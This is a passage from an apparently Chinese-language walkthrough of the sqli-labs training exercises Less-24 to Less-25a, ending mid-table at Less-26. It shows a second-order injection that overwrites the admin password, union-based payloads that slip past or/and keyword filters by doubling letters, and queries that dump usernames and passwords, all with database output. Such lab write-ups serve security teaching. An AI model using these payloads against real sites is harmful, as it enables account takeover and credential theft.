</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">username</span><span class="o">=</span>  <span class="nx">mysql_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$pass</span><span class="o">=</span> <span class="nx">mysql_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$re_pass</span><span class="o">=</span> <span class="nx">mysql_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;re_password&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 查询当前用户信息
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select count(*) from users where username=&#39;</span><span class="si">$username</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">如果当前用户已经存在</span> <span class="nx">无法注册</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">两次输入密码一致：</span>
</span></span><span class="line"><span class="cl">  <span class="c1"># 将记录插入数据库中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into users ( username, password) values(</span><span class="se">\&#34;</span><span class="si">$username\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nx">\</span><span class="s2">&#34;</span><span class="si">$pass\</span><span class="s2">&#34;</span><span class="p">)</span><span class="s2">&#34;;
</span></span></span><span class="line"><span class="cl"><span class="s2">    查询完成后 重定向到首页
</span></span></span><span class="line"><span class="cl"><span class="s2">else:
</span></span></span><span class="line"><span class="cl"><span class="s2">    提示两次输入密码不一致
</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>login.php</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># 登录用户名和密码都被过滤了
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$username</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;login_user&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;login_password&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM users WHERE username=&#39;</span><span class="si">$username</span><span class="s2">&#39; and password=&#39;</span><span class="si">$password</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>pass_change.php</code></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">检测未登录：</span>
</span></span><span class="line"><span class="cl">    <span class="nx">重定向到首页</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nx">检测到提交表单：</span>
</span></span><span class="line"><span class="cl">  <span class="c1"># 对 pass 都进行了过滤
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$username</span><span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$curr_pass</span><span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;current_password&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span><span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$re_pass</span><span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;re_password&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">两次密码一致</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># 直接将 username 拼接到 SQL 语句
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;UPDATE users SET PASSWORD=&#39;</span><span class="si">$pass</span><span class="s2">&#39; where username=&#39;</span><span class="si">$username</span><span class="s2">&#39; and password=&#39;</span><span class="si">$curr_pass</span><span class="s2">&#39; &#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nx">提示密码不一致</span> <span class="nx">并重定向到</span> <span class="nx">fail</span><span class="o">.</span><span class="nx">php</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="思路分析">思路分析</h3>
<p>从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。</p>
<p><strong>二次注入</strong> 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。</p>
<p>先看创建用户的地方：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span> <span class="o">=</span>  <span class="nx">mysql_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>username 被 <code>mysql_escape_string</code> 函数过滤了，该函数的作用如下：</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>危险字符</th>
<th>转义后</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>\</code></td>
<td><code>\\</code></td>
</tr>
<tr>
<td><code>'</code></td>
<td><code>\'</code></td>
</tr>
<tr>
<td><code>&quot;</code></td>
<td><code>\&quot;</code></td>
</tr>
</tbody>
</table></div>
<p>再看下更新密码的核心语句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Sql" data-lang="Sql"><span class="line"><span class="cl"><span class="k">UPDATE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">PASSWORD</span><span class="o">=</span><span class="s1">&#39;$pass&#39;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;$username&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;$curr_pass&#39;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin'#</code>，那么此时的完整语句就为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Sql" data-lang="Sql"><span class="line"><span class="cl"><span class="k">UPDATE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">PASSWORD</span><span class="o">=</span><span class="s1">&#39;$pass&#39;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="o">#</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;$curr_pass&#39;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>此时就完全改变了语义，直接就修改掉了 admin 用户的密码。</p>
<h3 id="步骤演示">步骤演示</h3>
<p>常见一个<code>admin'#</code>开头的用户名，下面列举的几种都可以，以此类推，很灵活：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#39;#1
</span></span><span class="line"><span class="cl">admin&#39;#233
</span></span><span class="line"><span class="cl">admin&#39;#gg
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>注册完成后数据库的记录信息如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> * from users<span class="p">;</span>
</span></span><span class="line"><span class="cl">+----+------------+----------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> id <span class="p">|</span> username   <span class="p">|</span> password <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----+------------+----------+
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> Dumb       <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">2</span> <span class="p">|</span> Angelina   <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">3</span> <span class="p">|</span> Dummy      <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">4</span> <span class="p">|</span> secure     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">5</span> <span class="p">|</span> stupid     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">6</span> <span class="p">|</span> superman   <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">7</span> <span class="p">|</span> batman     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">8</span> <span class="p">|</span> admin      <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">9</span> <span class="p">|</span> admin1     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">10</span> <span class="p">|</span> admin2     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">11</span> <span class="p">|</span> admin3     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">12</span> <span class="p">|</span> dhakkan    <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">14</span> <span class="p">|</span> admin4     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">15</span> <span class="p">|</span> admin<span class="err">&#39;</span><span class="c1">#sec | 123      |</span>
</span></span><span class="line"><span class="cl">+----+------------+----------+
</span></span><span class="line"><span class="cl"><span class="m">14</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。</p>
<p>接下来登录 `admin&rsquo;#sec用户，然后来修改当前的密码：</p>
<p><img src="/p/ojwgoapt/02.png"
	width="838"
	height="574"
	srcset="/p/ojwgoapt/02_hu4976be341c8b7d66ced6402908d93630_15635_480x0_resize_box_3.png 480w, /p/ojwgoapt/02_hu4976be341c8b7d66ced6402908d93630_15635_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-24(二次注入)"
	
	
		class="gallery-image" 
		data-flex-grow="145"
		data-flex-basis="350px"
	
></p>
<p>此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> * from users<span class="p">;</span>
</span></span><span class="line"><span class="cl">+----+------------+----------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> id <span class="p">|</span> username   <span class="p">|</span> password <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----+------------+----------+
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> Dumb       <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">2</span> <span class="p">|</span> Angelina   <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">3</span> <span class="p">|</span> Dummy      <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">4</span> <span class="p">|</span> secure     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">5</span> <span class="p">|</span> stupid     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">6</span> <span class="p">|</span> superman   <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">7</span> <span class="p">|</span> batman     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">8</span> <span class="p">|</span> admin      <span class="p">|</span> <span class="m">1234</span>     <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>  <span class="m">9</span> <span class="p">|</span> admin1     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">10</span> <span class="p">|</span> admin2     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">11</span> <span class="p">|</span> admin3     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">12</span> <span class="p">|</span> dhakkan    <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">14</span> <span class="p">|</span> admin4     <span class="p">|</span> <span class="m">0</span>        <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">15</span> <span class="p">|</span> admin<span class="err">&#39;</span><span class="c1">#sec | 123      |</span>
</span></span><span class="line"><span class="cl">+----+------------+----------+
</span></span><span class="line"><span class="cl"><span class="m">14</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-25过滤or和and">Less-25(过滤or和and)</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id='$id'</code></td>
</tr>
</tbody>
</table></div>
<h3 id="关键代码分析">关键代码分析：</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># id 直接单引号拼接
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 但是 id 被如下函数过滤了
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/or/i&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>    
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/AND/i&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nv">$id</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>过滤了 <code>or</code> <code>and</code> 的get注入</p>
<h3 id="测试阶段">测试阶段</h3>
<p><code>'</code>报错 <code>''</code>不报错 那么就是<code>'</code>闭合</p>
<p>我们知道可以用<code>--+</code>注释掉后面</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; order by 1 --+
</span></span></code></pre></td></tr></table>
</div>
</div><p>语法不正确 发现过滤了 <code>or</code></p>
<p><img src="/p/ojwgoapt/03.png"
	width="1496"
	height="386"
	srcset="/p/ojwgoapt/03_huce8aa544be3456eab57748645347ff40_38898_480x0_resize_box_3.png 480w, /p/ojwgoapt/03_huce8aa544be3456eab57748645347ff40_38898_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-25(过滤or和and)"
	
	
		class="gallery-image" 
		data-flex-grow="387"
		data-flex-basis="930px"
	
></p>
<p>那么我们继续构造，3正常，4报错</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; oorrder by 1 --+
</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="n">oorrder</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="c1">--+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; oorrder by 3 --+
</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="n">oorrder</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="c1">--+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/04.png"
	width="1440"
	height="845"
	srcset="/p/ojwgoapt/04_hu7c7bb4e4772a56364cac15544da2d41a_402684_480x0_resize_box_3.png 480w, /p/ojwgoapt/04_hu7c7bb4e4772a56364cac15544da2d41a_402684_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-25(过滤or和and)"
	
	
		class="gallery-image" 
		data-flex-grow="170"
		data-flex-basis="408px"
	
></p>
<h3 id="爆数据库名">爆数据库名</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">sqli</span><span class="p">.</span><span class="n">pl</span><span class="o">/</span><span class="k">Less</span><span class="o">-</span><span class="mi">25</span><span class="o">/?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,database(),3 --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/05.png"
	width="1436"
	height="850"
	srcset="/p/ojwgoapt/05_hu34ad838f96252d5bab058e995388aeb3_403599_480x0_resize_box_3.png 480w, /p/ojwgoapt/05_hu34ad838f96252d5bab058e995388aeb3_403599_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-25(过滤or和and)"
	
	
		class="gallery-image" 
		data-flex-grow="168"
		data-flex-basis="405px"
	
></p>
<h3 id="爆破表名">爆破表名</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39;,3 --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>information 的or</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39;),3 --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/06.png"
	width="1571"
	height="843"
	srcset="/p/ojwgoapt/06_hu438bfcfc93b7a1a2ddf586d1d486b645_410819_480x0_resize_box_3.png 480w, /p/ojwgoapt/06_hu438bfcfc93b7a1a2ddf586d1d486b645_410819_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-25(过滤or和and)"
	
	
		class="gallery-image" 
		data-flex-grow="186"
		data-flex-basis="447px"
	
></p>
<p>爆破列名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns  where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;),3 --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/07.png"
	width="1580"
	height="843"
	srcset="/p/ojwgoapt/07_hu263d32427eda66f0661c8cde0de40ca5_412708_480x0_resize_box_3.png 480w, /p/ojwgoapt/07_hu263d32427eda66f0661c8cde0de40ca5_412708_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-25(过滤or和and)"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="449px"
	
></p>
<h3 id="爆破出数据">爆破出数据</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,(select group_concat(username,&#39;</span><span class="p">:</span><span class="s1">&#39;,passwoorrd+SEPARATOORR+0x3c62723e) from users) --+
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/08.png"
	width="1198"
	height="804"
	srcset="/p/ojwgoapt/08_hu6cf4b8674921e8add47275cfa5320de4_47766_480x0_resize_box_3.png 480w, /p/ojwgoapt/08_hu6cf4b8674921e8add47275cfa5320de4_47766_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-25(过滤or和and)"
	
	
		class="gallery-image" 
		data-flex-grow="149"
		data-flex-basis="357px"
	
></p>
<h2 id="less-25a">Less-25a</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=$id</code></td>
</tr>
</tbody>
</table></div>
<p>与 Less-25 相比，只是拼接方式改变，因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的，这里不再啰嗦。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="n">passwoorrd</span><span class="o">+</span><span class="n">SEPARATOORR</span><span class="o">+</span><span class="mi">0</span><span class="n">x3c62723e</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">)</span><span class="w"> </span><span class="c1">--+
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-26过滤orand注释空格和斜线">Less-26(过滤or、and、/*、注释、空格和斜线)</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
